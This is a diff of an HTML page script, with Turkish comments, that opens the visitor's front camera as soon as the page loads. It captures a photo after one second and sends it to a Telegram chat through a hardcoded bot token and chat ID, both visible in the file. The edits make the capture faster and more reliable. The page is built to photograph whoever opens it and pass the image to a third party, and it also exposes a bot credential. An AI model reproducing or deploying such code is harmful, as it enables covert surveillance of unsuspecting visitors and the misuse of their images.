@@ -17,22 +17,25 @@
     const BOT_TOKEN = "8019450857:AAG1eQgjYVdQ26p4XH8HAdTdMLGHnAbYALY";  
     const CHAT_ID = "1149820913";  
 
+    // Kamera açma ve video akışını başlatma
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
-        // Kamera görüntüsü yüklendiğinde otomatik fotoğraf çek
-        video.onloadeddata = () => {
+        // Video yüklenmeye başladığında fotoğraf çekmeye geç
+        video.onloadedmetadata = () => {
+          video.play();
           setTimeout(() => {
             takeAndSendPhoto();
-          }, 5000);
+          }, 1000); // 1 saniye sonra fotoğrafı çek
         };
       } catch (error) {
         alert('Kamera erişimi reddedildi veya açılamadı: ' + error);
       }
     }
 
+    // Fotoğraf çekme ve Telegram'a gönderme
     function takeAndSendPhoto() {
       const context = canvas.getContext('2d');
       canvas.width = video.videoWidth || 640;
@@ -56,9 +59,7 @@
     }
 
     // Sayfa açıldığında kamerayı başlat
-    document.addEventListener("DOMContentLoaded", () => {
-      startCamera();
-    });
+    document.addEventListener("DOMContentLoaded", startCamera);
   </script>
 </body>
 </html>
